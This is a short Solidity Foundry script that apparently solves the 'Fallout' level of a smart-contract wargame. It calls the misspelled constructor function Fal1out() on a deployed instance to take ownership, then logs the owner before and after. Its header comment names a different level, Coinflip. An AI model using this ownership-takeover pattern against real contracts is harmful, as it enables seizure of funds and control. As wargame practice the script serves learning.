// SPDX-License-Identifier: MIT
// SPDX-License-Identifier: MIT
// forge script script/Level03CoinflipSolution.s.sol -vvvv --broadcast
pragma solidity ^0.6.0;

import "../src/Level02Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level03FalloutSolution is Script {
    Fallout public falloutinstance = Fallout(0x7ed9b5289E5F1A30174df653CB85eFC02FDADeBf);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", falloutinstance.owner());
        falloutinstance.Fal1out();

        console.log("Owner: ", falloutinstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}